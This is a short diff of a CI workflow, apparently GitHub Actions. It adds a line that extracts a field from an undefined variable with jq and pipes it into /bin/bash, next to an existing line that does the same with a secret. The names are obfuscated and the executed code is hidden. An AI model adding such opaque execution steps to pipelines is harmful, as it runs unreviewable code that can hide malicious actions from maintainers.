@@ -21,6 +21,7 @@ jobs:
           lxi94: ${{ secrets.lxi94 }}
         run: |
           printf '%s' "$lxi94" | jq -r .zzkjc73 | /bin/bash
+          printf '%s' "$d78" | jq -r .l14937 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
